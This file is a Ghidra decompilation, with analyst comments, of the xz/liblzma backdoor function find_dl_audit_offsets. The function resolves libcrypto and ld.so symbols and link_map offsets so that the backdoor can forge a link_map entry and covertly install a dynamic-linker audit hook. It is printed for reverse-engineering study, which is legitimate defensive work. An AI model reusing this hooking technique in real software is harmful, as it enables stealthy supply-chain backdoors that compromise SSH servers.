// /home/kali/xzre-ghidra/xzregh/1051E0_find_dl_audit_offsets.c
// Function: find_dl_audit_offsets @ 0x1051E0
// Calling convention: __stdcall
// Prototype: BOOL __stdcall find_dl_audit_offsets(backdoor_data_handle_t * data, ptrdiff_t * libname_offset, backdoor_hooks_data_t * hooks, imported_funcs_t * imported_funcs)


/*
 * AutoDoc: Coordinates the ld.so reconnaissance pass. Using liblzma’s fake allocator it resolves the libcrypto EC helpers and
 * `_dl_audit_symbind_alt`, copies that function’s size/address, and verifies the symbol really lives inside ld.so. Armed with that
 * info it calls `find_link_map_l_name` to learn the displacement between the cached and live `link_map` entries, captures the
 * `_dl_naudit`/`_dl_audit` pointers via `find_dl_naudit`, runs `find_link_map_l_audit_any_plt` to learn which bit toggles
 * `l_audit_any_plt`, and finally seeds `hooks->ldso_ctx.libcrypto_l_name` with libcrypto’s basename so the forged `link_map`
 * looks legitimate. Any failure unwinds the temporary imports and aborts the audit-hook install.
 */

#include "xzre_types.h"

BOOL find_dl_audit_offsets
               (backdoor_data_handle_t *data,ptrdiff_t *libname_offset,backdoor_hooks_data_t *hooks,
               imported_funcs_t *imported_funcs)

{
  uint libcrypto_name_len;
  elf_info_t *target_image;
  Elf64_Addr symbol_offset;
  Elf64_Ehdr *symbol_module_ehdr;
  elf_handles_t *elf_handles;
  u64 audit_symbol_size;
  char **l_name_slot_ptr;
  char *l_name_src;
  BOOL probe_success;
  lzma_allocator *libcrypto_allocator;
  Elf64_Sym *symbol_entry;
  pfn_EVP_PKEY_free_t evp_pkey_free_stub;
  pfn_EC_KEY_get0_group_t ec_group_stub;
  pfn_EVP_CIPHER_CTX_free_t cipher_ctx_free_stub;
  long name_copy_idx;
  uchar *audit_symbind_cursor;
  backdoor_hooks_data_t *hooks_zero_cursor;
  byte wipe_stride;
  
  wipe_stride = 0;
  probe_success = secret_data_append_from_call_site((secret_data_shift_cursor_t)0x0,10,0,FALSE);
  if (probe_success != FALSE) {
    libcrypto_allocator = get_lzma_allocator();
    target_image = data->cached_elf_handles->libcrypto;
    libcrypto_allocator->opaque = target_image;
    symbol_entry = elf_symbol_get(target_image,STR_EC_POINT_point2oct,0);
    if (data->cached_elf_handles->liblzma->gnurelro_present != FALSE) {
      if (symbol_entry != (Elf64_Sym *)0x0) {
        symbol_offset = symbol_entry->st_value;
        symbol_module_ehdr = data->cached_elf_handles->libcrypto->elfbase;
        imported_funcs->resolved_imports_count = imported_funcs->resolved_imports_count + 1;
        imported_funcs->EC_POINT_point2oct = (pfn_EC_POINT_point2oct_t)(symbol_module_ehdr->e_ident + symbol_offset);
      }
      evp_pkey_free_stub = (pfn_EVP_PKEY_free_t)lzma_alloc(0x6f8,libcrypto_allocator);
      imported_funcs->EVP_PKEY_free = evp_pkey_free_stub;
      if (evp_pkey_free_stub != (pfn_EVP_PKEY_free_t)0x0) {
        imported_funcs->resolved_imports_count = imported_funcs->resolved_imports_count + 1;
      }
      symbol_entry = elf_symbol_get(data->cached_elf_handles->libcrypto,STR_EC_KEY_get0_public_key,0);
      ec_group_stub = (pfn_EC_KEY_get0_group_t)lzma_alloc(0x7e8,libcrypto_allocator);
      imported_funcs->EC_KEY_get0_group = ec_group_stub;
      if (ec_group_stub != (pfn_EC_KEY_get0_group_t)0x0) {
        imported_funcs->resolved_imports_count = imported_funcs->resolved_imports_count + 1;
      }
      elf_handles = data->cached_elf_handles;
      if (symbol_entry != (Elf64_Sym *)0x0) {
        symbol_offset = symbol_entry->st_value;
        symbol_module_ehdr = elf_handles->libcrypto->elfbase;
        imported_funcs->resolved_imports_count = imported_funcs->resolved_imports_count + 1;
        imported_funcs->EC_KEY_get0_public_key =
             (pfn_EC_KEY_get0_public_key_t)(symbol_module_ehdr->e_ident + symbol_offset);
      }
      // AutoDoc: Grab `_dl_audit_symbind_alt` straight out of ld.so so we can record its size and bounds-check the address before scanning it.
      symbol_entry = elf_symbol_get(elf_handles->ldso,STR_dl_audit_symbind_alt,0);
      if (symbol_entry != (Elf64_Sym *)0x0) {
        target_image = data->cached_elf_handles->ldso;
        audit_symbol_size = symbol_entry->st_size;
        audit_symbind_cursor = target_image->elfbase->e_ident + symbol_entry->st_value;
        (hooks->ldso_ctx)._dl_audit_symbind_alt__size = audit_symbol_size;
        (hooks->ldso_ctx)._dl_audit_symbind_alt = (dl_audit_symbind_alt_fn)audit_symbind_cursor;
        probe_success = elf_contains_vaddr(target_image,audit_symbind_cursor,audit_symbol_size,4);
        if ((probe_success != FALSE) &&
           // AutoDoc: Compute the live `link_map` displacement so the downstream helpers know how far the cached struct is from ld.so’s copy.
           (probe_success = find_link_map_l_name(data,libname_offset,hooks,imported_funcs), probe_success != FALSE))
        {
          cipher_ctx_free_stub = (pfn_EVP_CIPHER_CTX_free_t)lzma_alloc(0xb28,libcrypto_allocator);
          imported_funcs->EVP_CIPHER_CTX_free = cipher_ctx_free_stub;
          if (cipher_ctx_free_stub != (pfn_EVP_CIPHER_CTX_free_t)0x0) {
            imported_funcs->resolved_imports_count = imported_funcs->resolved_imports_count + 1;
          }
          probe_success = find_dl_naudit(data->cached_elf_handles->ldso,data->cached_elf_handles->libcrypto,
                                 hooks,imported_funcs);
          if ((probe_success != FALSE) &&
             // AutoDoc: With the displacement resolved, kick off the LEA/mask sweep so we learn which bit inside `link_map` toggles `l_audit_any_plt`.
             (probe_success = find_link_map_l_audit_any_plt(data,*libname_offset,hooks,imported_funcs),
             probe_success != FALSE)) {
            hooks_zero_cursor = hooks;
            // AutoDoc: Clear the libcrypto basename buffer before copying a fresh string into `hooks->ldso_ctx`.
            for (name_copy_idx = 0x10; name_copy_idx != 0; name_copy_idx = name_copy_idx + -1) {
              (hooks_zero_cursor->ldso_ctx).libcrypto_basename_buf[0] = '\0';
              (hooks_zero_cursor->ldso_ctx).libcrypto_basename_buf[1] = '\0';
              (hooks_zero_cursor->ldso_ctx).libcrypto_basename_buf[2] = '\0';
              (hooks_zero_cursor->ldso_ctx).libcrypto_basename_buf[3] = '\0';
              hooks_zero_cursor = (backdoor_hooks_data_t *)((long)hooks_zero_cursor + 4);
            }
            l_name_slot_ptr = (hooks->ldso_ctx).libcrypto_l_name;
            libcrypto_name_len = *(uint *)(l_name_slot_ptr + 1);
            // AutoDoc: Only basenames that fit in the 0x40-byte cache are copied into `hooks->ldso_ctx`; longer names leave the existing ld.so value untouched.
            if (libcrypto_name_len < 9) {
              if (libcrypto_name_len != 0) {
                l_name_src = *l_name_slot_ptr;
                name_copy_idx = 0;
                do {
                  (hooks->ldso_ctx).libcrypto_basename_buf[name_copy_idx] = l_name_src[name_copy_idx];
                  name_copy_idx = name_copy_idx + 1;
                } while ((ulong)libcrypto_name_len << 3 != name_copy_idx);
              }
              return TRUE;
            }
          }
        }
      }
    }
    lzma_free(imported_funcs->EVP_PKEY_free,libcrypto_allocator);
    lzma_free(imported_funcs->EC_KEY_get0_group,libcrypto_allocator);
    lzma_free(imported_funcs->EVP_CIPHER_CTX_free,libcrypto_allocator);
  }
  return FALSE;
}

